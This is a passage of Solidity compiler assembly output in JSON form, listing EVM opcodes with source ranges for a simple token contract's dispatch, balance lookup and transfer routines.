											"name": "PUSH",
											"source": 0,
											"value": "A9059CBB"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 120,
											"end": 143,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 120,
											"end": 143,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 529,
											"end": 541,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 557,
											"end": 565,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 557,
											"end": 573,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 557,
											"end": 573,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 557,
											"end": 573,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 557,
											"end": 573,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 557,
											"end": 573,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 557,
											"end": 573,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 550,
											"end": 573,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 550,
											"end": 573,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 579,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 320,
											"end": 324,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 374,
											"end": 375,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 364,
											"end": 370,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 341,
											"end": 349,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 350,
											"end": 360,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 341,
											"end": 361,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 341,
											"end": 361,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 341,
											"end": 370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 341,
											"end": 370,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 341,
											"end": 370,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 341,
											"end": 370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 341,
											"end": 370,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 341,
											"end": 370,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 341,
											"end": 370,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 341,
											"end": 375,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 341,
											"end": 375,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 333,
											"end": 376,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 333,
											"end": 376,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 333,
											"end": 376,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 333,
											"end": 376,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 333,
											"end": 376,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 333,
											"end": 376,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 333,
											"end": 376,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 407,
											"end": 413,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 392,
											"end": 402,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 383,
											"end": 403,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 383,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 383,
											"end": 413,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 383,
											"end": 413,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 383,
											"end": 413,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 383,
											"end": 413,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 383,
											"end": 413,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 437,
											"end": 443,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 428,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 429,
											"end": 432,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 433,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 420,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 457,
											"end": 461,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 450,
											"end": 461,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 450,
											"end": 461,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 146,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 7,
											"end": 146,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 146,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 91,
											"end": 97,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 78,
											"end": 98,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 69,
											"end": 98,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 69,
											"end": 98,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 107,
											"end": 140,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 134,
											"end": 139,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 107,
											"end": 140,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 107,
											"end": 140,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 59,
											"end": 146,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 59,
											"end": 146,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 59,
											"end": 146,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 59,
											"end": 146,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 59,
											"end": 146,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 152,
											"end": 291,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 152,
											"end": 291,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 152,
											"end": 291,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 236,
											"end": 242,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 223,
											"end": 243,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 214,
											"end": 243,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 214,
											"end": 243,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 252,
											"end": 285,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 279,
											"end": 284,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 252,
											"end": 285,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 252,
											"end": 285,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 252,
											"end": 285,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 252,
											"end": 285,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 204,
											"end": 291,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 204,
											"end": 291,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 204,
											"end": 291,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 204,
											"end": 291,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 204,
											"end": 291,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 297,
											"end": 559,
											"name": "tag",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 297,
											"end": 559,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 297,
											"end": 559,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 405,
											"end": 407,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 393,
											"end": 402,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 384,
											"end": 391,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 380,
											"end": 403,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 376,
											"end": 408,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 373,
											"end": 375,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 373,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 373,
											"end": 375,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 421,
											"end": 422,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 411,
											"end": 423,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 373,
											"end": 375,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 373,
											"end": 375,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 464,
											"end": 465,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 489,
											"end": 542,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 534,
											"end": 541,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 525,
											"end": 531,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 514,
											"end": 523,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 510,
											"end": 532,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 489,
											"end": 542,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 489,
											"end": 542,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 489,
											"end": 542,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 489,
											"end": 542,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 479,
											"end": 542,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 479,
											"end": 542,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 435,
